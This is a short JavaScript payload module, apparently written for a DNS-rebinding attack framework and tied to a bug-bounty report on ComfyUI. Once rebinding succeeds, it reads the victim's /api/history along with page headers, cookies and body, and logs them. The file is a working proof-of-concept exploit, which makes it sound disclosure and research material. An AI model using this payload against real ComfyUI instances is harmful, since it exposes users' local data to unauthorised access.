/**
Sample ComfyUI payload to fetch and log the users history to the console
https://huntr.com/bounties/f1458e43-64a7-4df2-b71c-9ca453755dc7
**/

const ComfyUI = () => {

    // Invoked after DNS rebinding has been performed
    function attack(headers, cookie, body) {
        if (headers !== null) {
            console.log(`Origin: ${window.location} headers: ${httpHeaderstoText(headers)}`);
        };
        if (cookie !== null) {
            console.log(`Origin: ${window.location} headers: ${cookie}`);
        };
        if (body !== null) {
            console.log(`Origin: ${window.location} body:\n${body}`);
        };

		sooFetch('/api/history', {})
            .then(responseOKOrFail("Could not access the history"))
            .then(function (d) {
                console.log(`raw json history: ${d}`);
			})
    }

    // Invoked to determine whether the rebinded service
    // is the one targeted by this payload. Must return true or false.
    async function isService(headers, cookie, body) {
		if (body.includes("ComfyUI") === true) {
            return true;
        } else {
            return false;
        }
    }

    return {
        attack,
        isService
    }
}

// Registry value and manager-config.json value must match
Registry["ComfyUI"] = ComfyUI();

